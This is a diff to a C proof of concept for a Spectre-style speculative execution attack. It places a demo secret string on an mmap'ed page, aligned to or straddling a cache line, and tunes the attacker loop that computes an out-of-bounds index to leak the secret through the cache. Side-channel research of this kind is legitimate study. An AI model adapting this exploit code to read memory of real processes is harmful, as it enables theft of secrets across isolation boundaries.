@@ -17,7 +17,12 @@
 #define ISB() __asm__ __volatile__("isb" ::: "memory")
 
 // The secret information
-const char *secret = "The cake is a lie!";
+static const char secret_template[] = "The cake is a lie!";
+static char    *secret        = NULL;       // will point inside secret_page
+static uint8_t *secret_page   = NULL;       // base of mmap'ed page
+static size_t   secret_line_idx = 0; 
+
+static const char *secret1 = "The cake is a lie!";
 
 uint8_t* flush_buffer;
 
@@ -27,6 +32,103 @@ uint8_t* flush_buffer;
 #define EVICT_SIZE (64 * 1024 * 1024)
 #define STRIDE 128                      // cache line-ish
 static unsigned char *evict_buf = NULL;
+
+
+static void init_secret_on_page(size_t line_idx, bool cross_boundary)
+{
+    size_t page_size  = PAGE_SIZE;        // 16 KiB
+    size_t line_size  = CACHE_LINE_SIZE;  // 128 B
+    size_t secret_len = sizeof(secret_template) - 1; // without '\0'
+
+    // mmap a single page, page-aligned
+    secret_page = mmap(NULL, page_size,
+                       PROT_READ | PROT_WRITE,
+                       MAP_PRIVATE | MAP_ANONYMOUS,
+                       -1, 0);
+    if (secret_page == MAP_FAILED) {
+        perror("mmap secret_page");
+        exit(1);
+    }
+
+    size_t max_offset   = page_size - (secret_len + 1); // keep entire string in page
+    size_t nr_lines     = page_size / line_size;
+    size_t offset       = 0;
+
+    if (!cross_boundary) {
+        // Old behavior: start exactly on a cache-line boundary
+        if (line_idx >= nr_lines) {
+            fprintf(stderr,
+                    "Requested line index %zu is too large; max line is %zu\n",
+                    line_idx, nr_lines - 1);
+            exit(1);
+        }
+
+        offset = line_idx * line_size;
+
+        if (offset > max_offset) {
+            fprintf(stderr,
+                    "Cannot place secret at line %zu without leaving page\n",
+                    line_idx);
+            exit(1);
+        }
+    } else {
+        // New behavior: straddle the boundary between line_idx and line_idx+1
+        if (line_idx + 1 >= nr_lines) {
+            fprintf(stderr,
+                    "Need a next line to cross: line_idx=%zu, nr_lines=%zu\n",
+                    line_idx, nr_lines);
+            exit(1);
+        }
+
+        // Place the secret so that roughly half is before the boundary
+        // and half is after it.
+        size_t boundary   = (line_idx + 1) * line_size;
+        offset            = boundary - secret_len / 2;
+
+        // Clamp so we stay within [line_idx * line_size, page_size)
+        size_t min_offset = line_idx * line_size;
+        if (offset < min_offset) {
+            offset = min_offset;
+        }
+
+        if (offset > max_offset) {
+            fprintf(stderr,
+                    "Cannot place secret across line %zu without leaving page\n",
+                    line_idx);
+            exit(1);
+        }
+
+        // Optional sanity check: ensure we actually cross the boundary
+        if (!(offset < boundary && offset + secret_len > boundary)) {
+            fprintf(stderr,
+                    "Internal error: secret does not cross line boundary as intended\n");
+            exit(1);
+        }
+    }
+
+    secret_line_idx = line_idx;
+    secret          = (char *)(secret_page + offset);
+
+    // Copy secret into that position (including '\0')
+    memcpy(secret, secret_template, secret_len + 1);
+
+    printf("Secret_page base = %p, secret = %p (line %zu, %s boundary)\n",
+           (void*)secret_page,
+           (void*)secret,
+           secret_line_idx,
+           cross_boundary ? "straddling" : "aligned to");
+}
+
+static void destroy_secret_page(void)
+{
+    if (secret_page) {
+        munmap(secret_page, PAGE_SIZE);
+        secret_page = NULL;
+        secret      = NULL;
+    }
+}
+
+
 
 static inline void init_eviction_buffer(void) {
     if (!evict_buf) {
@@ -136,15 +238,17 @@ void naive_attacker() {
     printf("SYMBOL_CNT: %d\n", SYMBOL_CNT);
     size_t stride = PAGE_SIZE;
 
-    int32_t malicious_index = (int64_t)secret - (int64_t)array;
-    printf("Secret address: %p, Array address: %p\n", secret, array);
-    printf("The malicious index is %p-%p=%#x\n", secret, array,
+    const bool mmap_or_const = false;
+    const char *use_this = mmap_or_const ? secret1 : secret;
+    int32_t malicious_index = (int64_t)use_this - (int64_t)array;
+    printf("Secret address: %p, Array address: %p\n", use_this, array);
+    printf("The malicious index is %p-%p=%#x\n", use_this, array,
            malicious_index);
     printf("-----------------------------------------\n");
     uint64_t fuzzy_evict_got_it_wrong = 0;
-    for (size_t c = 0; c < strlen(secret); c++) {
-        for (size_t r = 0; r < 200; r++) {
-            for (size_t t = 0; t < 16; t++) {
+    for (size_t c = 0; c < strlen(use_this); c++) {
+        for (size_t r = 0; r < 500; r++) {
+            for (size_t t = 0; t < 128; t++) {
                 bool is_attack = (t % 8 == 8 - 1);
                 int32_t index = cselect(malicious_index + c, 0, is_attack);
 
@@ -171,11 +275,21 @@ void naive_attacker() {
     return;
 }
 
-int main1(int argc, char **argv) {
+int main(int argc, char **argv) {
     flush_buffer = (uint8_t*)malloc(256 * PAGE_SIZE);
+
+    // Choose which cache line within the page to place the secret on.
+    // Default: line 0 if no argument is given.
+    size_t line_idx = 0;
+    if (argc > 1) {
+        line_idx = strtoul(argv[1], NULL, 0);
+    }
+
+    init_secret_on_page(line_idx, false);
 
     printf(YELLOW_F "Using a naive Spectre PoC\n" RESET_C);
     naive_attacker();
 
+    destroy_secret_page();
     return 0;
 }
